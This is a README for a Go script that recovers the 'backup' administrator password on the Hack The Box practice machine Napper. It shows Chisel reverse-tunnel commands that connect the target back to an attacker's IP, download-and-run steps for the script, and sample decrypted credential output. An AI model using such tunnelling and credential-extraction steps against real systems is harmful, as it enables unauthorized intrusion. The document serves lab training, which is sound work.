## About

A GO Lang script that will get you the password for the Administrator user `backup` on [Napper](https://app.hackthebox.com/machines/Napper).<br>

## Requirements

Your machine has to be linked to Napper with a reverse port forward on port 9200. Here's a way to do it using [Chisel](https://github.com/jpillora/chisel).
  - Run this on your linux machine:
```console
user@kali:~$ chisel server -p 9000 --reverse
user@kali:~$
```
  - Run this on Napper:
```console
C:\Users\ruben\Desktop> chisel.exe client <YOUR_IP>:9000 R:9200:127.0.0.1:9200
C:\Users\ruben\Desktop> 
```
> **Change `<YOUR_IP>` with your `tun0` IP address.**<br>
> *You can also use an available port different than 9000 if you want.<br>
> `chisel.exe` is **NOT** installed by default on Napper. It is your job to get it on Napper before using this script.*

Obviously GO Lang has to be installed on your linux machine (where the script will be executed). If you don't have it installed yet, visit [this link](https://go.dev/doc/install).<br>

## Usage

Firstly you download the script. After that you give the script the execution permission. Finally you run the script.
```console
user@kali:~$ wget https://github.com/0tonoon/Napper_Script/blob/main/Pass_script
user@kali:~$ sudo chmod +x Pass_script
user@kali:~$ go run Pass_script
user@kali:~$ 
```
If all went well, it will produce an output similar to this:
```console
Key: 6b871be7d935fc2a7d2a974b798e6c9b
IV: 87f47937c807cf2c6c98e01a11684ea7
Encrypted Data: 3c09b34edb32df9cb252ae6f7c84e8b61ddaf9ee88508f79c104f3d7ee61317ed38eb8cfb2173e16
Decrypted Data: qFrbskeXMiWlmnyqtlrwkqqHmcztbBmXUdfAlgvn
```
<hr>

`Decrypted Data` is the password for the `backup` user. Now it's your turn to find a way to use it and finish your privesc.
